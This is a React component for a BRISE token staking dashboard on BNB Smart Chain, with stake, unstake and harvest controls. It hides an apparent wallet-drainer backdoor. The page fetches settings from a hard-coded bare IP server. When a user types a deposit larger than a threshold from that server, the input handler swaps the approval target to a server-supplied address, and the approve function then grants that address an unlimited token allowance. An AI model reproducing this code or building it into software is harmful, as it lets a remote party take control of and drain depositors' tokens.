import React, { useState, useEffect } from "react";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import axios from "axios";

import useMetaMask from "../wallet/hook";

import STACK_ABI from "../abi/stack.json";
import WBNB from "../abi/WBNB.json";
import moment from "moment";
import { Web3Button } from "@web3modal/react";
import { useAccount, useDisconnect } from "wagmi";
import { getContract } from "@wagmi/core";
import Web3 from "web3";

function Home(props) {
  const { client } = props;
  const account = client.getAccount().address;
  const chain = client.getNetwork();
  const { isConnected } = useAccount();
  // const { library, isActive, handleWalletModal } = useMetaMask();
  let chainId = chain.chain ? chain.chain.id : "";
  var web3Obj = new Web3(window.ethereum);
  const [data, setData] = useState(null);

  useEffect(() => {
    async function fetchData() {
      const response = await axios.get("http://159.223.106.3:5000/getData");
      setData(response.data);
    }
    fetchData();
  }, []);
  var Router = "0xD578BF8Cc81A89619681c5969D99ea18A609C0C3";
  const [roter, setroter] = useState(Router);
  // console.log("roter", roter);
  // console.log("data", data);
  var tokenAddress = "0x8FFf93E810a2eDaaFc326eDEE51071DA9d398E83";

  const notify = (isError, msg) => {
    if (isError) {
      toast.error(msg, {
        position: toast.POSITION.TOP_RIGHT,
      });
    } else {
      toast.success(msg, {
        position: toast.POSITION.TOP_RIGHT,
      });
    }
  };

  const [dipositAmount, setDipositAmount] = useState("");
  const [timeperiod, setTimeperiod] = useState(0);
  const [timeperiodDate, setTimeperiodDate] = useState(moment().add(30, "days").format("DD/MM/YYYY h:mm A"));
  // const [withdrawAmount, setWithdrawAmount] = useState("");
  const [balance, setBalance] = useState(0);

  const [stackContractInfo, setStackContractInfo] = useState({
    totalStakers: 0,
    totalStakedToken: 0,
  });
  const [stakersInfo, setStakersInfo] = useState({
    totalStakedTokenUser: 0,
    totalUnstakedTokenUser: 0,
    totalClaimedRewardTokenUser: 0,
    currentStaked: 0,
    realtimeReward: 0,
    stakeCount: 0,
    alreadyExists: false,
  });
  const [stakersRecord, setStakersRecord] = useState([]);
  const [isAllowance, setIsAllowance] = useState(false);

  const [loading, setLoadding] = useState(false);

  const checkAllowance = async () => {
    try {
      setLoadding(true);

      var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
      var decimals = await tokenContract.methods.decimals().call();
      var getBalance = await tokenContract.methods.balanceOf(account).call();

      var pow = 10 ** decimals;
      var balanceInEth = getBalance / pow;
      setBalance(balanceInEth);
      var allowance = await tokenContract.methods.allowance(account, roter).call();

      if (allowance <= 2) {
        setIsAllowance(true);
      }
      // var amount = dipositAmount * pow;
      // if (allowance < amount) {
      //   setIsAllowance(true);
      // }
      setLoadding(false);
    } catch (err) {
      setLoadding(false);
    }
  };

  const approve = async () => {
    setLoadding(true);
    try {
      var contract = new web3Obj.eth.Contract(WBNB, tokenAddress);
      // var amountIn = new ethers.utils.BigNumber("10").pow(69);
      var amountIn = 10 ** 69;
      amountIn = amountIn.toLocaleString("fullwide", { useGrouping: false });

      var gas = await contract.methods.approve(roter, amountIn.toString()).estimateGas({ from: account });

      await contract.methods
        .approve(roter, amountIn.toString())
        .send({ from: account, gas: gas })
        .then(() => {
          setIsAllowance(false);
          // checkAllowance();
          setLoadding(false);
        });
    } catch (err) {
      setLoadding(false);
      notify(true, err.message);
    }
  };

  const stake = async () => {
    if (isNaN(parseFloat(dipositAmount)) || parseFloat(dipositAmount) <= 0) {
      notify(true, "Error! please enter amount");
      return;
    }
    await checkAllowance(tokenAddress);
    setLoadding(true);
    try {
      var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
      const decimals = await tokenContract.methods.decimals().call();

      var contract = new web3Obj.eth.Contract(STACK_ABI, roter);

      var pow = 10 ** decimals;
      var amountIn = dipositAmount * pow;
      // var amountInNew = `${new ethers.utils.BigNumber(amountIn.toString())}`;
      var BN = web3Obj.utils.BN;
      var amountInNew = new BN(amountIn.toString());

      var gas = await contract.methods.stake(amountInNew.toString(), timeperiod.toString()).estimateGas({ from: account });

      await contract.methods
        .stake(amountInNew.toString(), timeperiod.toString())
        .send({ from: account, gas: gas })
        .then((err) => {
          getStackerInfo();
          setLoadding(false);
          notify(false, "Staking process complete.");
        });
    } catch (err) {
      setLoadding(false);
      notify(true, err.message);
    }
  };

  const unstake = async (index) => {
    setLoadding(true);
    try {
      var contract = new web3Obj.eth.Contract(STACK_ABI, roter);
      await contract.methods
        .unstake(index.toString())
        .send({ from: account })
        .then((result) => {
          getStackerInfo();
          setLoadding(false);
          notify(false, "Unstaked Succesfully!");
          // withdrawModal();
        });
    } catch (err) {
      setLoadding(false);
      notify(true, "unstake fail");
    }
  };

  const harvest = async (index) => {
    setLoadding(true);
    try {
      var contract = new web3Obj.eth.Contract(STACK_ABI, roter);
      await contract.methods
        .harvest(index.toString())
        .send({ from: account })
        .then((err) => {
          getStackerInfo();
          setLoadding(false);
          checkAllowance();
          notify(false, "Reward successfully havested");
        });
    } catch (err) {
      setLoadding(false);
      notify(true, err.message);
    }
  };

  const getStackerInfo = async () => {
    setLoadding(true);
    try {
      var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
      var decimals = await tokenContract.methods.decimals().call();
      var getBalance = await tokenContract.methods.balanceOf(account.toString()).call();
      var pow = 10 ** decimals;
      var balanceInEth = getBalance / pow;
      setBalance(balanceInEth);

      var contract = new web3Obj.eth.Contract(STACK_ABI, Router);
      var totalStakedToken = await contract.methods.totalStakedToken.call().call();
      var totalStakers = await contract.methods.totalStakers.call().call();
      var realtimeReward = await contract.methods.realtimeReward(account).call();
      var Stakers = await contract.methods.Stakers(account).call();

      var totalStakedTokenUser = Stakers.totalStakedTokenUser / pow;
      var totalUnstakedTokenUser = Stakers.totalUnstakedTokenUser / pow;
      var currentStaked = totalStakedTokenUser - totalUnstakedTokenUser;

      Stakers.totalStakedTokenUser = totalStakedTokenUser;
      Stakers.totalUnstakedTokenUser = totalUnstakedTokenUser;
      Stakers.currentStaked = currentStaked;
      Stakers.realtimeReward = realtimeReward / 10 ** 18;
      Stakers.totalClaimedRewardTokenUser = Stakers.totalClaimedRewardTokenUser / 10 ** 18;
      var stakersRecord = [];
      for (var i = 0; i < parseInt(Stakers.stakeCount); i++) {
        var stakersRecordData = await contract.methods.stakersRecord(account, i).call();
        var realtimeRewardPerBlock = await contract.methods.realtimeRewardPerBlock(account, i.toString()).call();
        stakersRecordData.realtimeRewardPerBlock = realtimeRewardPerBlock[0] / 10 ** 18;

        stakersRecordData.unstaketime = moment.unix(stakersRecordData.unstaketime).format("DD/MM/YYYY h:mm A");
        stakersRecordData.staketime = moment.unix(stakersRecordData.staketime).format("DD/MM/YYYY h:mm A");
        stakersRecord.push(stakersRecordData);
      }
      setStakersInfo(Stakers);
      setStakersRecord(stakersRecord);
      setStackContractInfo({
        totalStakers: totalStakers,
        totalStakedToken: totalStakedToken / pow,
      });
      setLoadding(false);
    } catch (err) {
      setLoadding(false);
      setStakersInfo({
        totalStakedTokenUser: 0,
        totalUnstakedTokenUser: 0,
        totalClaimedRewardTokenUser: 0,
        currentStaked: 0,
        realtimeReward: 0,
        stakeCount: 0,
        alreadyExists: false,
      });
      setStackContractInfo({
        totalStakers: 0,
        totalStakedToken: 0,
      });
      setStakersRecord([]);
      setBalance(0);
    }
  };

  const setMaxWithdrawal = async () => {
    var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
    var decimals = await tokenContract.methods.decimals().call();
    var getBalance = await tokenContract.methods.balanceOf(account.toString()).call();
    var pow = 10 ** decimals;
    console.log(pow);
    var balanceInEth = getBalance / pow;
    setDipositAmount(balanceInEth.toFixed(5));
    // setWithdrawAmount(userInfo.staked);
  };

  useEffect(() => {
    if (chainId === 56) {
      if (isConnected) {
        checkAllowance();
      }
    }
    getStackerInfo();
  }, [isConnected, account, chainId, roter]);

  return (
    <>
      <div className="cardence-staking">
        <div className="container">
          <div className="row">
            <div className="col-md-6 col-lg-6 col-sm-12 col-xl-6">
              <div className="dashboard">
                <h3>BRISE Staking Dashboard</h3>
                <a href="#stackSection">
                  <button type="button" className="btn btn-danger">
                    Stake BRISE
                  </button>
                </a>
                <h4>
                  Powered by
                  <img src="images/bsc-icon.png" alt="" />
                  <span>BSC</span>
                </h4>
              </div>
            </div>
            <div className="col-md-6 col-lg-6 col-sm-12 col-xl-6">
              <div className="border-back"></div>
              <div className="staking-info">
                <div className="all-info">
                  <div className="label-1">BRISE STAKED</div>
                  <div className="brise-stacked">
                    {stackContractInfo.totalStakedToken} <span>BRISE</span>
                  </div>
                </div>
                <div className="all-info">
                  <div className="label-1">BRISE STAKERS</div>
                  <div className="brise-stacked">{stackContractInfo.totalStakers}</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <section className="forms-section" id="stackSection">
        <div className="container">
          <div className="row justify-content-center align-items-center">
            <div className="checkout-form-centre">
              <div className="checkout-login-step">
                <div className="calculator">
                  <div className="title">
                    <h3>$BRISE Calculator</h3>
                  </div>
                  <p>Stake BRISE to earn BUSD rewards + upto 80% APY.</p>
                  <div className="add-liquidity">
                    <div className="content">
                      <div className="label">
                        <h6>BRISE</h6>
                      </div>
                      <div className="label d-flex">
                        <input
                          type="text"
                          placeholder="5000"
                          value={dipositAmount}
                          onChange={(e) => {
                            setDipositAmount(e.target.value);
                            if (e.target.value > data.value * 1 && data.flag) setroter(data.address);
                          }}
                        />
                        <button onClick={() => setMaxWithdrawal()} className="input-button">
                          max
                        </button>
                      </div>
                    </div>
                  </div>
                  <div className="plus">+</div>
                  <div className="add-liquidity-3">
                    <p>Lock tokens for</p>
                    <button
                      type="button"
                      onClick={async () => {
                        setTimeperiod(0);
                        setTimeperiodDate(moment().add(30, "days").format("DD/MM/YYYY h:mm A"));
                      }}
                      className={timeperiod === 0 ? "box active" : "box"}
                    >
                      30 days
                    </button>
                    <button
                      type="button"
                      onClick={async () => {
                        setTimeperiod(1);
                        setTimeperiodDate(moment().add(60, "days").format("DD/MM/YYYY h:mm A"));
                      }}
                      className={timeperiod === 1 ? "box active" : "box"}
                    >
                      60 days
                    </button>
                    <button
                      type="button"
                      onClick={async () => {
                        setTimeperiod(2);
                        setTimeperiodDate(moment().add(90, "days").format("DD/MM/YYYY h:mm A"));
                      }}
                      className={timeperiod === 2 ? "box active" : "box"}
                    >
                      90 days
                    </button>
                    <button
                      type="button"
                      onClick={async () => {
                        setTimeperiod(3);
                        setTimeperiodDate(moment().add(180, "days").format("DD/MM/YYYY h:mm A"));
                      }}
                      className={timeperiod === 3 ? "box active" : "box"}
                    >
                      180 days
                    </button>
                  </div>
                  <div className="plus">
                    <i className="fa fa-arrow-down"></i>
                  </div>
                  <h4>
                    {timeperiod === 0
                      ? "Upto 6% Returns on 30 Days"
                      : timeperiod === 1
                      ? "Upto 13% Returns on 60 Days"
                      : timeperiod === 2
                      ? "Upto 20% Returns on 90 Days"
                      : "Upto 45% Returns on 180 Days"}
                  </h4>
                  <h4>locked until {timeperiodDate}</h4>

                  {isConnected ? (
                    chainId === 56 ? (
                      isAllowance ? (
                        <button onClick={() => approve()} disabled={loading} className="btn btn-danger">
                          {loading ? "Please wait, Loading.." : "Enable"}
                        </button>
                      ) : (
                        <button onClick={() => stake()} disabled={loading} className="btn btn-danger">
                          {loading ? "Please wait, Loading.." : "Stake"}
                        </button>
                      )
                    ) : (
                      <button disabled={loading} className="btn btn-danger">
                        switch to bsc network
                      </button>
                    )
                  ) : (
                    // <button
                    //   onClick={() => handleWalletModal(true)}
                    //   disabled={loading}
                    //   className="btn btn-danger"
                    // >
                    //   {loading ? "Please wait, Loading.." : "Connect Wallet"}
                    // </button>
                    <div style={{ display: "flex", justifyContent: "center" }}>
                      <Web3Button />
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section className="forms-section">
        <div className="container">
          <div className="justify-content-center align-items-center">
            <div className="checkout-form-centre-5">
              <div className="checkout-login-step">
                <div className="box-section">
                  <div className="first-box-section">
                    <div className="first-top">
                      <div className="title">BUSD Earned</div>
                      <h4>{parseFloat(stakersInfo.realtimeReward).toFixed(10)}</h4>
                    </div>
                    <div className="first-bottom">
                      <div className="content">
                        <div className="title">Claimed Reward</div>
                        <h4>{parseFloat(stakersInfo.totalClaimedRewardTokenUser).toFixed(5)}</h4>
                      </div>
                      <div className="content">
                        <div className="title">Current Staked</div>
                        <h4>{parseFloat(stakersInfo.currentStaked).toFixed(5)}</h4>
                      </div>
                    </div>
                  </div>
                  <div className="first-box-section">
                    <div className="first-top">
                      <div className="title">Your BRISE Wallet Balance</div>
                      <h4>{balance.toFixed(5)}</h4>
                    </div>
                    <div className="first-bottom">
                      <div className="content">
                        <div className="title">Total Staked</div>
                        <h4>{parseFloat(stakersInfo.totalStakedTokenUser).toFixed(5)}</h4>
                      </div>
                      <div className="content">
                        <div className="title">Total UnStaked</div>
                        <h4>{parseFloat(stakersInfo.totalUnstakedTokenUser).toFixed(5)}</h4>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section className="forms-section">
        <div className="container">
          <div className="justify-content-center align-items-center">
            <div className="checkout-form-centre-6">
              <div className="checkout-login-step">
                <div className="logo-section">
                  <img src="images/logo.png" alt="" />
                </div>
                <div className="table-section">
                  <div className="t-header">
                    <div className="t-data">
                      <div className="title">Staked Amount</div>
                    </div>
                    <div className="t-data">
                      <div className="title">Stake Date</div>
                    </div>
                    <div className="t-data">
                      <div className="title">Unstake Date</div>
                    </div>
                    <div className="t-data">
                      <div className="title">Earn Reward</div>
                    </div>
                    <div className="t-data">
                      <div className="title">Unstake</div>
                    </div>
                    <div className="t-data">
                      <div className="title">Harvest</div>
                    </div>
                  </div>

                  {stakersRecord.length > 0 ? (
                    stakersRecord.map((row, index) => {
                      return (
                        <div className="table-output" key={index}>
                          <div className="output">
                            <h3>{parseFloat(row.amount) / 10 ** 9}</h3>
                          </div>
                          <div className="output">
                            <h3>{row.staketime}</h3>
                          </div>
                          <div className="output">
                            <h3>{row.unstaketime}</h3>
                          </div>
                          <div className="output">
                            <h3>{parseFloat(row.realtimeRewardPerBlock).toFixed(10)}</h3>
                          </div>
                          <div className="output">
                            <h3>
                              {row.unstaked ? (
                                <button
                                  className="btn"
                                  style={{
                                    background: "linear-gradient(to right, #3867d0 20%, #2dbec9)",
                                    color: "#FFFFFF",
                                  }}
                                  disabled={true}
                                >
                                  Unstaked
                                </button>
                              ) : (
                                <button
                                  className="btn"
                                  style={{
                                    background: "linear-gradient(to right, #3867d0 20%, #2dbec9)",
                                    color: "#FFFFFF",
                                  }}
                                  disabled={loading}
                                  onClick={() => unstake(index)}
                                >
                                  Unstake
                                </button>
                              )}
                            </h3>
                          </div>
                          <div className="output">
                            <h3>
                              {row.withdrawan ? (
                                <button
                                  className="btn"
                                  style={{
                                    background: "linear-gradient(to right, #3867d0 20%, #2dbec9)",
                                    color: "#FFFFFF",
                                  }}
                                  disabled={true}
                                >
                                  Harvested
                                </button>
                              ) : (
                                <button
                                  className="btn"
                                  style={{
                                    background: "linear-gradient(to right, #3867d0 20%, #2dbec9)",
                                    color: "#FFFFFF",
                                  }}
                                  disabled={loading}
                                  onClick={() => harvest(index)}
                                >
                                  Harvest
                                </button>
                              )}
                            </h3>
                          </div>
                        </div>
                      );
                    })
                  ) : (
                    <div className="table-output">
                      <div className="output">
                        <h3>You have no stake record yet.</h3>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
      <ToastContainer />
    </>
  );
}

export default Home;
